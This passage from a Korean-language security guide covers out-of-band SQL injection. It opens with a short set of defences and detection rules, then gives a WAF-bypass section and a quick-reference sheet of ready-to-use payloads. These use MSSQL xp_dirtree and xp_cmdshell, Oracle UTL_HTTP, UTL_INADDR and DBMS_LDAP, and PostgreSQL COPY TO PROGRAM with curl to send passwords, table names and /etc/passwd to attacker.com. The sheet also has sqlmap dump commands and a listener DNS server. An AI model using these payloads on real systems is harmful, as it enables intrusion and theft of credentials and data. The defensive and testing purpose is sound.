<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$stmt = $pdo-&gt;prepare(&quot;SELECT * FROM products WHERE id = ?&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$stmt-&gt;execute([$_GET[&#x27;id&#x27;]]);</span><br></span></code></pre></div></div>
<p><strong>Input Validation</strong>:</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$id = filter_var($_GET[&#x27;id&#x27;], FILTER_VALIDATE_INT);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">if ($id === false) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    die(&quot;Invalid input&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="5-모니터링-및-탐지">5. 모니터링 및 탐지<a href="#5-모니터링-및-탐지" class="hash-link" aria-label="Direct link to 5. 모니터링 및 탐지" title="Direct link to 5. 모니터링 및 탐지" translate="no">​</a></h3>
<p><strong>이상 DNS 쿼리 탐지</strong>:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># 비정상적으로 긴 도메인 탐지</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">tcpdump -i any -n port 53 | grep -E &#x27;.{50,}&#x27;</span><br></span></code></pre></div></div>
<p><strong>로그 분석 (Splunk 쿼리)</strong>:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">index=dns | where len(query) &gt; 50 | stats count by query, src_ip</span><br></span></code></pre></div></div>
<p><strong>Suricata 룰</strong>:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">alert dns any any -&gt; any any (msg:&quot;Possible DNS Exfiltration&quot;; dns_query; content:&quot;.burpcollaborator.net&quot;; sid:1000001;)</span><br></span></code></pre></div></div>
<hr>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="waf-우회-기법">WAF 우회 기법<a href="#waf-우회-기법" class="hash-link" aria-label="Direct link to WAF 우회 기법" title="Direct link to WAF 우회 기법" translate="no">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="1-dns-터널링-우회">1. DNS 터널링 우회<a href="#1-dns-터널링-우회" class="hash-link" aria-label="Direct link to 1. DNS 터널링 우회" title="Direct link to 1. DNS 터널링 우회" translate="no">​</a></h3>
<p><strong>데이터를 Hex로 인코딩</strong>:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># MSSQL</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&#x27;; DECLARE @hex VARCHAR(1024);</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">SET @hex=(SELECT master.dbo.fn_varbintohexstr(CONVERT(VARBINARY, (SELECT password FROM users WHERE id=1))));</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">EXEC(&#x27;</span><span class="token plain">xp_dirtree </span><span class="token string" style="color:#e3116c">&quot;\\&#x27;+@hex+&#x27;.attacker.com\a&quot;</span><span class="token plain">&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token comment" style="color:#999988;font-style:italic">--</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="2-http-헤더-사용">2. HTTP 헤더 사용<a href="#2-http-헤더-사용" class="hash-link" aria-label="Direct link to 2. HTTP 헤더 사용" title="Direct link to 2. HTTP 헤더 사용" translate="no">​</a></h3>
<p><strong>User-Agent에 데이터 삽입 (Oracle)</strong>:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">&#x27; AND UTL_HTTP.REQUEST(&#x27;</span><span class="token plain">http:</span><span class="token comment" style="color:#999988;font-style:italic">//attacker.com/&#x27;, NULL, &#x27;User-Agent: &#x27;||(SELECT password FROM users WHERE username=&#x27;admin&#x27;))=&#x27;1&#x27;--</span><br></span></code></pre></div></div>
<p><strong>공격자 서버 로그</strong>:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">User-Agent: 5f4dcc3b5aa765d61d8327deb882cf99</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="3-icmp-터널링">3. ICMP 터널링<a href="#3-icmp-터널링" class="hash-link" aria-label="Direct link to 3. ICMP 터널링" title="Direct link to 3. ICMP 터널링" translate="no">​</a></h3>
<p><strong>ping으로 데이터 전송 (고급)</strong>:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># MSSQL + xp_cmdshell</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&#x27;; EXEC xp_cmdshell &#x27;</span><span class="token plain">ping </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">n </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> attacker</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">com&#x27;</span><span class="token comment" style="color:#999988;font-style:italic">--</span><br></span></code></pre></div></div>
<hr>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="트러블슈팅-체크리스트">트러블슈팅 체크리스트<a href="#트러블슈팅-체크리스트" class="hash-link" aria-label="Direct link to 트러블슈팅 체크리스트" title="Direct link to 트러블슈팅 체크리스트" translate="no">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="dns-쿼리가-수신되지-않을-때">DNS 쿼리가 수신되지 않을 때<a href="#dns-쿼리가-수신되지-않을-때" class="hash-link" aria-label="Direct link to DNS 쿼리가 수신되지 않을 때" title="Direct link to DNS 쿼리가 수신되지 않을 때" translate="no">​</a></h3>
<ul class="contains-task-list containsTaskList_mC6p">
<li class="task-list-item"><input type="checkbox" disabled=""> <!-- -->방화벽이 아웃바운드 DNS를 차단하는지 확인</li>
<li class="task-list-item"><input type="checkbox" disabled=""> <!-- -->DB 서버가 인터넷 연결되어 있는지 확인</li>
<li class="task-list-item"><input type="checkbox" disabled=""> <!-- -->DNS 서버 (Burp Collaborator 등)가 정상 작동하는지 확인</li>
<li class="task-list-item"><input type="checkbox" disabled=""> <!-- -->DBMS 권한이 제한되어 있는지 확인 (xp_dirtree, UTL_HTTP 등)</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="http-요청이-수신되지-않을-때">HTTP 요청이 수신되지 않을 때<a href="#http-요청이-수신되지-않을-때" class="hash-link" aria-label="Direct link to HTTP 요청이 수신되지 않을 때" title="Direct link to HTTP 요청이 수신되지 않을 때" translate="no">​</a></h3>
<ul class="contains-task-list containsTaskList_mC6p">
<li class="task-list-item"><input type="checkbox" disabled=""> <!-- -->방화벽이 아웃바운드 HTTP/HTTPS를 차단하는지 확인</li>
<li class="task-list-item"><input type="checkbox" disabled=""> <!-- -->DB 서버의 프록시 설정 확인</li>
<li class="task-list-item"><input type="checkbox" disabled=""> <!-- -->SSRF 방어 메커니즘 확인</li>
<li class="task-list-item"><input type="checkbox" disabled=""> <!-- -->공격자 서버가 공인 IP를 가지고 있는지 확인</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="데이터가-잘려서-수신될-때">데이터가 잘려서 수신될 때<a href="#데이터가-잘려서-수신될-때" class="hash-link" aria-label="Direct link to 데이터가 잘려서 수신될 때" title="Direct link to 데이터가 잘려서 수신될 때" translate="no">​</a></h3>
<ul class="contains-task-list containsTaskList_mC6p">
<li class="task-list-item"><input type="checkbox" disabled=""> <!-- -->DNS 라벨 길이 제한 (63자) 고려하여 분할 전송</li>
<li class="task-list-item"><input type="checkbox" disabled=""> <!-- -->HTTP GET 길이 제한 고려 (POST 메서드 사용 검토)</li>
<li class="task-list-item"><input type="checkbox" disabled=""> <!-- -->특수문자 인코딩 (Base64, Hex 등)</li>
<li class="task-list-item"><input type="checkbox" disabled=""> <!-- -->데이터 압축 시도</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="sqlmap-oob가-작동하지-않을-때">SQLMap OOB가 작동하지 않을 때<a href="#sqlmap-oob가-작동하지-않을-때" class="hash-link" aria-label="Direct link to SQLMap OOB가 작동하지 않을 때" title="Direct link to SQLMap OOB가 작동하지 않을 때" translate="no">​</a></h3>
<ul class="contains-task-list containsTaskList_mC6p">
<li class="task-list-item"><input type="checkbox" disabled=""> <code>--dns-domain</code> 옵션 정확히 지정했는지 확인</li>
<li class="task-list-item"><input type="checkbox" disabled=""> <!-- -->DBMS 타입 명시 (<code>--dbms=mssql</code>)</li>
<li class="task-list-item"><input type="checkbox" disabled=""> <code>--technique</code> 옵션 확인</li>
<li class="task-list-item"><input type="checkbox" disabled=""> <!-- -->Verbose 모드로 상세 로그 확인 (<code>-v 3</code>)</li>
</ul>
<hr>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="빠른-명령어-참조-quick-reference">빠른 명령어 참조 (Quick Reference)<a href="#빠른-명령어-참조-quick-reference" class="hash-link" aria-label="Direct link to 빠른 명령어 참조 (Quick Reference)" title="Direct link to 빠른 명령어 참조 (Quick Reference)" translate="no">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="mssql---dns-exfiltration">MSSQL - DNS Exfiltration<a href="#mssql---dns-exfiltration" class="hash-link" aria-label="Direct link to MSSQL - DNS Exfiltration" title="Direct link to MSSQL - DNS Exfiltration" translate="no">​</a></h3>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># 기본 테스트</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&#x27;; EXEC xp_dirtree &#x27;</span><span class="token plain">\\attacker</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">com\a</span><span class="token string" style="color:#e3116c">&#x27;--</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c"></span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c"># DB 이름</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">&#x27;</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">DECLARE</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">@db</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">VARCHAR</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1024</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">SET</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">@db</span><span class="token operator" style="color:#393A34">=</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> DB_NAME</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">EXEC</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;xp_dirtree &quot;\\&#x27;</span><span class="token operator" style="color:#393A34">+</span><span class="token variable" style="color:#36acaa">@db</span><span class="token operator" style="color:#393A34">+</span><span class="token string" style="color:#e3116c">&#x27;.attacker.com\a&quot;&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token comment" style="color:#999988;font-style:italic">--</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 테이블 이름</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&#x27;; DECLARE @tbl VARCHAR(1024); SET @tbl=(SELECT TOP 1 name FROM sys.tables); EXEC(&#x27;</span><span class="token plain">xp_dirtree </span><span class="token string" style="color:#e3116c">&quot;\\&#x27;+@tbl+&#x27;.attacker.com\a&quot;</span><span class="token plain">&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token comment" style="color:#999988;font-style:italic">--</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 데이터 추출</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&#x27;; DECLARE @data VARCHAR(1024); SET @data=(SELECT TOP 1 password FROM users); EXEC(&#x27;</span><span class="token plain">xp_dirtree </span><span class="token string" style="color:#e3116c">&quot;\\&#x27;+@data+&#x27;.attacker.com\a&quot;</span><span class="token plain">&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token comment" style="color:#999988;font-style:italic">--</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 분할 전송 (1-30글자)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&#x27;; DECLARE @data VARCHAR(30); SET @data=(SELECT SUBSTRING(password, 1, 30) FROM users WHERE id=1); EXEC(&#x27;</span><span class="token plain">xp_dirtree </span><span class="token string" style="color:#e3116c">&quot;\\&#x27;+@data+&#x27;.1.attacker.com\a&quot;</span><span class="token plain">&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token comment" style="color:#999988;font-style:italic">--</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="oracle---http-exfiltration">Oracle - HTTP Exfiltration<a href="#oracle---http-exfiltration" class="hash-link" aria-label="Direct link to Oracle - HTTP Exfiltration" title="Direct link to Oracle - HTTP Exfiltration" translate="no">​</a></h3>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># 기본 테스트</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&#x27; AND UTL_HTTP.REQUEST(&#x27;</span><span class="token plain">http:</span><span class="token comment" style="color:#999988;font-style:italic">//attacker.com/test&#x27;)=&#x27;1&#x27;--</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># DB 이름</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&#x27; AND UTL_HTTP.REQUEST(&#x27;</span><span class="token plain">http:</span><span class="token comment" style="color:#999988;font-style:italic">//attacker.com/?db=&#x27;||(SELECT ora_database_name FROM dual))=&#x27;1&#x27;--</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 테이블 이름</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&#x27; AND UTL_HTTP.REQUEST(&#x27;</span><span class="token plain">http:</span><span class="token comment" style="color:#999988;font-style:italic">//attacker.com/?tbl=&#x27;||(SELECT table_name FROM user_tables WHERE ROWNUM=1))=&#x27;1&#x27;--</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 데이터 추출</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&#x27; AND UTL_HTTP.REQUEST(&#x27;</span><span class="token plain">http:</span><span class="token comment" style="color:#999988;font-style:italic">//attacker.com/?pass=&#x27;||(SELECT password FROM users WHERE username=&#x27;admin&#x27;))=&#x27;1&#x27;--</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Base64 인코딩</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&#x27; AND UTL_HTTP.REQUEST(&#x27;</span><span class="token plain">http:</span><span class="token comment" style="color:#999988;font-style:italic">//attacker.com/?data=&#x27;||UTL_RAW.CAST_TO_VARCHAR2(UTL_ENCODE.BASE64_ENCODE(UTL_RAW.CAST_TO_RAW((SELECT password FROM users WHERE ROWNUM=1)))))=&#x27;1&#x27;--</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="oracle---dns-exfiltration">Oracle - DNS Exfiltration<a href="#oracle---dns-exfiltration" class="hash-link" aria-label="Direct link to Oracle - DNS Exfiltration" title="Direct link to Oracle - DNS Exfiltration" translate="no">​</a></h3>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># UTL_INADDR</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&#x27; AND UTL_INADDR.GET_HOST_ADDRESS((SELECT password FROM users WHERE ROWNUM=1)||&#x27;</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">attacker</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">com</span><span class="token string" style="color:#e3116c">&#x27;)=&#x27;</span><span class="token number" style="color:#36acaa">1</span><span class="token string" style="color:#e3116c">&#x27;--</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c"></span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c"># DBMS_LDAP</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">AND</span><span class="token plain"> DBMS_LDAP</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">INIT</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> password </span><span class="token keyword" style="color:#00009f">FROM</span><span class="token plain"> users </span><span class="token keyword" style="color:#00009f">WHERE</span><span class="token plain"> ROWNUM</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">||</span><span class="token string" style="color:#e3116c">&#x27;.attacker.com&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">80</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;1&#x27;</span><span class="token comment" style="color:#999988;font-style:italic">--</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="postgresql---copy-to-program">PostgreSQL - COPY TO PROGRAM<a href="#postgresql---copy-to-program" class="hash-link" aria-label="Direct link to PostgreSQL - COPY TO PROGRAM" title="Direct link to PostgreSQL - COPY TO PROGRAM" translate="no">​</a></h3>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># 버전 정보</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&#x27;; COPY (SELECT version()) TO PROGRAM &#x27;</span><span class="token plain">curl http:</span><span class="token comment" style="color:#999988;font-style:italic">//attacker.com/?v=$(cat)&#x27;--</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 데이터 추출</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&#x27;; COPY (SELECT password FROM users WHERE username=&#x27;</span><span class="token plain">admin</span><span class="token string" style="color:#e3116c">&#x27;) TO PROGRAM &#x27;</span><span class="token plain">curl http:</span><span class="token comment" style="color:#999988;font-style:italic">//attacker.com/?pass=$(cat)&#x27;--</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 파일 읽기</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&#x27;; COPY (SELECT pg_read_file(&#x27;</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">etc</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">passwd</span><span class="token string" style="color:#e3116c">&#x27;)) TO PROGRAM &#x27;</span><span class="token plain">curl http:</span><span class="token comment" style="color:#999988;font-style:italic">//attacker.com/?file=$(cat)&#x27;--</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="sqlmap-oob">SQLMap OOB<a href="#sqlmap-oob" class="hash-link" aria-label="Direct link to SQLMap OOB" title="Direct link to SQLMap OOB" translate="no">​</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># MSSQL DNS</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sqlmap -u &quot;URL&quot; --dbms=mssql --dns-domain=attacker.com --batch</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 현재 DB</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sqlmap -u &quot;URL&quot; --dns-domain=attacker.com --current-db</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 테이블 열거</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sqlmap -u &quot;URL&quot; --dns-domain=attacker.com -D dbname --tables</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 데이터 덤프</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sqlmap -u &quot;URL&quot; --dns-domain=attacker.com -D dbname -T users --dump</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># POST 요청</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sqlmap -r request.txt --dns-domain=attacker.com -p parameter</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="dns-서버-설정-1">DNS 서버 설정<a href="#dns-서버-설정-1" class="hash-link" aria-label="Direct link to DNS 서버 설정" title="Direct link to DNS 서버 설정" translate="no">​</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># Burp Collaborator (권장)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Burp Suite Professional 필요</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># DNSLog.cn (무료)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># https://dnslog.cn/ → Get SubDomain</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Python DNS 서버</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sudo python3 -c &quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">from dnslib import *</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">from dnslib.server import *</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">class L:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    def resolve(self, r, h):</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        print(f&#x27;DNS: {r.q.qname}&#x27;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        rr = r.reply()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        rr.add_answer(RR(str(r.q.qname), QTYPE.A, rdata=A(&#x27;1.2.3.4&#x27;), ttl=60))</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        return rr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">DNSServer(L(), port=53, address=&#x27;0.0.0.0&#x27;).start_thread()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">input()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="http-서버-설정-1">HTTP 서버 설정<a href="#http-서버-설정-1" class="hash-link" aria-label="Direct link to HTTP 서버 설정" title="Direct link to HTTP 서버 설정" translate="no">​</a></h3>
